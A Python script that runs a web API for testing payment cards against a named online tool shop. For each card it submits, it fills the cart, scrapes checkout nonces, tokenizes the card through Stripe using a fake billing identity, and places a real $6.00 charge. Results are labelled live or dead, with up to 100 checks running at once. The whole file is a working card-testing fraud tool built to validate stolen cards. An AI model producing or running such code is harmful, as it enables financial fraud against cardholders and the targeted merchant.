#!/usr/bin/env python3
"""
HandToolEssentials.com Stripe Charge Checker API
Flow: Add to Cart → Checkout Page → Extract Nonces → Tokenize → Charge
"""

import asyncio
import aiohttp
import json
import random
import re
import string
import time
from datetime import datetime
from typing import Dict, Optional, Tuple
import sys
import socket
from aiohttp import web

# ========== CONFIGURATION ==========
CONFIG = {
    "domain": "handtoolessentials.com",
    "product_id": "615",  # T-Handle Wrench
    "max_concurrent": 100,
    "port": 8000,
    "stripe_key": "pk_live_5ZSl1RXFaQ9bCbELMfLZxCsG"  # From your curl
}

# ========== HELPER FUNCTIONS ==========

def generate_email() -> str:
    """Generate random email."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'

def parse_cc_line(cc_string: str) -> Optional[Dict]:
    """Parse card from various formats."""
    cc_string = cc_string.strip()
    if not cc_string:
        return None
    
    # Remove spaces
    cc_string = cc_string.replace(' ', '')
    
    # Try different separators
    for sep in ['|', ':', ';', '/', '-']:
        if sep in cc_string:
            parts = [p.strip() for p in cc_string.split(sep) if p.strip()]
            if len(parts) >= 4:
                card_num = None
                month = None
                year = None
                cvv = None
                
                for part in parts:
                    if re.match(r'^\d{15,16}$', part) and not card_num:
                        card_num = part
                    elif re.match(r'^\d{1,2}$', part) and not month:
                        month = part.zfill(2)
                    elif re.match(r'^\d{2,4}$', part) and not year:
                        year = part[-2:] if len(part) > 2 else part
                    elif re.match(r'^\d{3,4}$', part) and not cvv:
                        cvv = part
                
                if card_num and month and year and cvv:
                    return {
                        "number": card_num,
                        "month": month,
                        "year": year,
                        "cvv": cvv
                    }
    
    # Check pipe format
    if re.match(r'^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc_string):
        parts = cc_string.split('|')
        return {
            "number": parts[0],
            "month": parts[1].zfill(2),
            "year": parts[2][-2:] if len(parts[2]) > 2 else parts[2],
            "cvv": parts[3]
        }
    
    return None

def extract_nonce(html: str, name: str) -> Optional[str]:
    """Extract nonce value using split method (as requested)."""
    try:
        # Pattern: value="XXXXX" 
        pattern = f'{name}" value="'
        if pattern in html:
            return html.split(pattern)[1].split('"')[0]
        return None
    except:
        return None

# ========== CHARGE CHECKER ==========

class HandToolsChargeChecker:
    def __init__(self, domain: str):
        self.domain = domain
        self.session = None
        self.cookies = {}
        self.headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        }
    
    async def __aenter__(self):
        """Create session with cookie jar."""
        self.session = aiohttp.ClientSession()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def add_to_cart(self, product_id: str = "615", quantity: int = 1) -> bool:
        """Step 1: Add product to cart via AJAX."""
        try:
            url = f"https://{self.domain}/?wc-ajax=add_to_cart"
            
            headers = {
                **self.headers,
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": f"https://{self.domain}",
                "referer": f"https://{self.domain}/shop/tools/t-handle-wrench/",
                "x-requested-with": "XMLHttpRequest"
            }
            
            data = {
                "product_sku": "",
                "product_id": product_id,
                "quantity": str(quantity)
            }
            
            async with self.session.post(url, headers=headers, data=data) as resp:
                if resp.status == 200:
                    result = await resp.json()
                    # Check for cart hash in response
                    return result.get('cart_hash') is not None
                return False
        except Exception as e:
            print(f"Add to cart error: {e}")
            return False
    
    async def get_checkout_page(self) -> Optional[str]:
        """Step 2: Get checkout page HTML and extract nonces."""
        try:
            url = f"https://{self.domain}/checkout/"
            
            headers = {
                **self.headers,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "referer": f"https://{self.domain}/cart/",
                "upgrade-insecure-requests": "1"
            }
            
            async with self.session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    return await resp.text()
                return None
        except Exception:
            return None
    
    def extract_checkout_nonces(self, html: str) -> Dict[str, str]:
        """Extract all needed nonces from checkout page."""
        nonces = {}
        
        # Extract wcal_guest_capture_nonce
        nonces['wcal_nonce'] = extract_nonce(html, 'wcal_guest_capture_nonce')
        
        # Extract woocommerce-process-checkout-nonce
        nonces['checkout_nonce'] = extract_nonce(html, 'woocommerce-process-checkout-nonce')
        
        return nonces
    
    async def create_payment_method(self, card: Dict, email: str, name: str, phone: str, address: Dict) -> Optional[str]:
        """Step 3: Create Stripe payment method token."""
        try:
            url = "https://api.stripe.com/v1/payment_methods"
            
            headers = {
                "authority": "api.stripe.com",
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": self.headers["user-agent"]
            }
            
            data = {
                "billing_details[name]": name,
                "billing_details[email]": email,
                "billing_details[phone]": phone,
                "billing_details[address][city]": address['city'],
                "billing_details[address][country]": address['country'],
                "billing_details[address][line1]": address['line1'],
                "billing_details[address][line2]": address.get('line2', ''),
                "billing_details[address][postal_code]": address['postal_code'],
                "billing_details[address][state]": address['state'],
                "type": "card",
                "card[number]": card['number'],
                "card[cvc]": card['cvv'],
                "card[exp_year]": card['year'],
                "card[exp_month]": card['month'],
                "key": CONFIG["stripe_key"],
                "_stripe_version": "2024-06-20"
            }
            
            async with self.session.post(url, headers=headers, data=data) as resp:
                if resp.status == 200:
                    result = await resp.json()
                    return result.get('id')
                return None
        except Exception as e:
            print(f"PM creation error: {e}")
            return None
    
    async def process_checkout(self, pm_id: str, email: str, nonces: Dict[str, str]) -> Dict:
        """Step 4: Process final checkout with payment method."""
        try:
            url = f"https://{self.domain}/?wc-ajax=checkout"
            
            headers = {
                **self.headers,
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": f"https://{self.domain}",
                "referer": f"https://{self.domain}/checkout/",
                "x-requested-with": "XMLHttpRequest"
            }
            
            # Base checkout data from your curl
            data = {
                "wc_order_attribution_source_type": "typein",
                "wc_order_attribution_referrer": f"https://{self.domain}/my-account/payment-methods/",
                "wc_order_attribution_utm_campaign": "(none)",
                "wc_order_attribution_utm_source": "(direct)",
                "wc_order_attribution_utm_medium": "(none)",
                "wc_order_attribution_utm_content": "(none)",
                "wc_order_attribution_utm_id": "(none)",
                "wc_order_attribution_utm_term": "(none)",
                "wc_order_attribution_utm_source_platform": "(none)",
                "wc_order_attribution_utm_creative_format": "(none)",
                "wc_order_attribution_utm_marketing_tactic": "(none)",
                "wc_order_attribution_session_entry": f"https://{self.domain}/my-account/add-payment-method/",
                "wc_order_attribution_session_start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "wc_order_attribution_session_pages": "11",
                "wc_order_attribution_session_count": "1",
                "wc_order_attribution_user_agent": self.headers["user-agent"],
                "billing_email": email,
                "billing_first_name": "Ayush",
                "billing_last_name": "Kumar",
                "billing_company": "",
                "billing_country": "US",
                "billing_address_1": "Street avi 23",
                "billing_address_2": "",
                "billing_city": "NY",
                "billing_state": "NY",
                "billing_postcode": "10080",
                "billing_phone": "5284623491",
                "wcal_guest_capture_nonce": nonces.get('wcal_nonce', ''),
                "_wp_http_referer": "/checkout/",
                "account_password": "",
                "shipping_first_name": "",
                "shipping_last_name": "",
                "shipping_company": "",
                "shipping_country": "US",
                "shipping_address_1": "",
                "shipping_address_2": "",
                "shipping_city": "",
                "shipping_state": "CA",
                "shipping_postcode": "",
                "shipping_phone": "",
                "order_comments": "",
                "shipping_method[0]": "free_shipping:1",
                "payment_method": "stripe",
                "wc-stripe-payment-method-upe": "",
                "wc_stripe_selected_upe_payment_type": "",
                "wc-stripe-is-deferred-intent": "1",
                "terms": "on",
                "terms-field": "1",
                "woocommerce-process-checkout-nonce": nonces.get('checkout_nonce', ''),
                "_wp_http_referer": "/?wc-ajax=update_order_review",
                "wc-stripe-payment-method": pm_id
            }
            
            async with self.session.post(url, headers=headers, data=data) as resp:
                if resp.status == 200:
                    return await resp.json()
                return {"result": "failure", "messages": f"HTTP Error: {resp.status}"}
        except Exception as e:
            return {"result": "failure", "messages": str(e)}
    
    async def charge_card(self, card_string: str) -> Dict:
        """Complete charge flow: Add to Cart → Checkout → Tokenize → Charge"""
        start_time = time.time()
        
        try:
            # Step 0: Parse card
            card = parse_cc_line(card_string)
            if not card:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "INVALID_FORMAT",
                    "live": False,
                    "time": int((time.time() - start_time) * 1000)
                }
            
            # Step 1: Add to cart
            cart_success = await self.add_to_cart()
            if not cart_success:
                return {
                    "cc": card['number'][:6] + "..." + card['number'][-4:],
                    "status": "ERROR",
                    "code": "ADD_TO_CART_FAILED",
                    "live": False,
                    "time": int((time.time() - start_time) * 1000)
                }
            
            # Step 2: Get checkout page and extract nonces
            checkout_html = await self.get_checkout_page()
            if not checkout_html:
                return {
                    "cc": card['number'][:6] + "..." + card['number'][-4:],
                    "status": "ERROR",
                    "code": "CHECKOUT_PAGE_FAILED",
                    "live": False,
                    "time": int((time.time() - start_time) * 1000)
                }
            
            nonces = self.extract_checkout_nonces(checkout_html)
            if not nonces.get('checkout_nonce'):
                return {
                    "cc": card['number'][:6] + "..." + card['number'][-4:],
                    "status": "ERROR",
                    "code": "NONCE_EXTRACTION_FAILED",
                    "live": False,
                    "time": int((time.time() - start_time) * 1000)
                }
            
            # Step 3: Create payment method
            email = generate_email()
            address = {
                "city": "NY",
                "country": "US",
                "line1": "Street avi 23",
                "postal_code": "10080",
                "state": "NY"
            }
            
            pm_id = await self.create_payment_method(
                card=card,
                email=email,
                name="Ayush Kumar",
                phone="5284623491",
                address=address
            )
            
            if not pm_id:
                return {
                    "cc": card['number'][:6] + "..." + card['number'][-4:],
                    "status": "ERROR",
                    "code": "PAYMENT_METHOD_FAILED",
                    "live": False,
                    "time": int((time.time() - start_time) * 1000)
                }
            
            # Step 4: Process checkout
            result = await self.process_checkout(pm_id, email, nonces)
            
            # Step 5: Parse result
            if result.get('result') == 'success':
                return {
                    "cc": card['number'][:6] + "..." + card['number'][-4:],
                    "status": "CHARGED",
                    "code": "PAYMENT_SUCCESS",
                    "amount": "$6.00",
                    "redirect": result.get('redirect', ''),
                    "live": True,
                    "msg": result,
                    "time": int((time.time() - start_time) * 1000)
                }
            elif result.get('result') == 'failure':
                if 'declined' in result.get('messages') :
                	return {
	                    "cc": card['number'][:6] + "..." + card['number'][-4:],
	                    "status": "DECLINED",
	                    "code": "CHARGE_FAILED",
	                    "error": 'Card Declined',
	                    "live": False,
	                    "msg": result,
	                    "time": int((time.time() - start_time) * 1000)
	                }
                elif 'insufficient' in result.get('messages'):
                	return {
	                    "cc": card['number'][:6] + "..." + card['number'][-4:],
	                    "status": "APPROVED",
	                    "code": "INSUFFICIENT_FUNDS",
	                    "error": 'insufficient funds',
	                    "live": True,
	                    "msg": result,
	                    "time": int((time.time() - start_time) * 1000)
	                }
                else:
                     return {
	                    "cc": card['number'][:6] + "..." + card['number'][-4:],
	                    "status": "DECLINED",
	                    "code": "CHARGE_FAILED",
	                    "error": 'Card Declined',
	                    "live": False,
	                    "msg": result,
	                    "time": int((time.time() - start_time) * 1000)
	                }
                
        except Exception as e:
            return {
                "cc": card_string[:6] + "..." + card_string[-4:],
                "status": "ERROR",
                "code": "CHECK_ERROR",
                "error": str(e)[:50],
                "live": False,
                "time": int((time.time() - start_time) * 1000)
            }

# ========== API HANDLERS ==========

semaphore = asyncio.Semaphore(CONFIG["max_concurrent"])

async def charge_handler(request):
    """Handle /charge?cc=... requests."""
    cc_param = request.query.get('cc', '')
    
    if not cc_param:
        return web.json_response({
            "error": "Missing cc parameter",
            "usage": "/charge?cc=4111111111111111|12|25|123"
        }, status=400)
    
    async with semaphore:
        try:
            async with HandToolsChargeChecker(CONFIG["domain"]) as checker:
                result = await checker.charge_card(cc_param)
                return web.json_response(result)
        except Exception as e:
            return web.json_response({
                "cc": cc_param[:6] + "..." + cc_param[-4:],
                "status": "ERROR",
                "code": "API_ERROR",
                "error": str(e)[:50],
                "live": False
            }, status=500)

async def health_handler(request):
    """Health check endpoint."""
    return web.json_response({
        "status": "online",
        "service": "HandTools Charge Checker API",
        "flow": "Add to Cart → Checkout → Tokenize → Charge",
        "max_concurrent": CONFIG["max_concurrent"]
    })

async def root_handler(request):
    """Root endpoint with instructions."""
    return web.json_response({
        "name": "HandToolEssentials.com Charge Checker",
        "version": "1.0",
        "flow": [
            "1. Add product to cart",
            "2. Fetch checkout page & extract nonces",
            "3. Create Stripe payment method",
            "4. Process final checkout with charge"
        ],
        "endpoints": {
            "/charge?cc={card}": "Attempt to charge card (adds to cart first)",
            "/health": "Check API status"
        },
        "examples": {
            "pipe": "/charge?cc=4111111111111111|12|25|123",
            "colon": "/charge?cc=4111111111111111:12:25:123",
            "space": "/charge?cc=4111111111111111 12 25 123"
        },
        "responses": {
            "success": '{"status": "CHARGED", "amount": "$6.00", "live": true}',
            "declined": '{"status": "DECLINED", "error": "Your card was declined."}'
        }
    })

# ========== MAIN ==========

async def main():
    """Start the API server."""
    print("\033[96m\033[1m")
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║      HANDTOOLESSENTIALS.COM CHARGE CHECKER API               ║")
    print("║      Add to Cart → Checkout → Tokenize → Charge              ║")
    print("║      $6.00 Test Charges | 100 Concurrent                     ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print("\033[0m")
    
    # Get local IP
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    # Setup app
    app = web.Application()
    app.router.add_get('/', root_handler)
    app.router.add_get('/charge', charge_handler)
    app.router.add_get('/health', health_handler)
    
    print(f"\033[92m✅ Server started!\033[0m")
    print(f"\033[93m📱 Local: http://localhost:{CONFIG['port']}\033[0m")
    print(f"\033[93m🌐 Network: http://{local_ip}:{CONFIG['port']}\033[0m")
    print(f"\033[96m🚀 Max concurrent: {CONFIG['max_concurrent']}\033[0m")
    print(f"\033[92m📝 Use /charge?cc=CARD\033[0m\n")
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', CONFIG["port"])
    await site.start()
    
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\033[93m⚠️ Server stopped\033[0m")
    except Exception as e:
        print(f"\033[91m❌ Error: {e}\033[0m")